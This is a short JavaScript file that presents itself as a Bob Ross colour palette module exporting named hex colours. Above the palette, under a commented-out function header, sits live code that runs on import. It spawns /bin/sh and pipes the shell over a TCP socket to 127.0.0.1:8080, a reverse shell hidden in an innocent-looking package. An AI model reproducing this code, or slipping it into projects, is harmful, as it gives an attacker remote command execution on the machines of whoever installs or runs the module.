// @see: http://thomaspark.co/2015/11/bob-ross-color-palette-in-css/

// export function hello(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
//}

var colors = {
  SAP_GREEN: '#0A3410',
  ALIZARIN_CRIMSON: '#4E1500',
  VAN_DYKE_BROWN: '#221B15',
  DARK_SIENNA: '#5F2E1F',
  MIDNIGHT_BLACK: '#000000',
  PRUSSIAN_BLUE: '#021E44',
  PHTHALO_BLUE: '#0C0040',
  PHTHALO_GREEN: '#102E3C',
  CADMIUM_YELLOW: '#FFEC00',
  YELLOW_OCHRE: '#C79B00',
  INDIAN_YELLOW: '#FFB800',
  BRIGHT_RED: '#DB0000',
  TITANIUM_WHITE: '#FFFFFF',
};

module.exports.colors = colors;
module.exports.palette = [];

for (var color in colors) {
  if (colors.hasOwnProperty(color)) {
    module.exports.palette.push(colors[color]);
  }
}
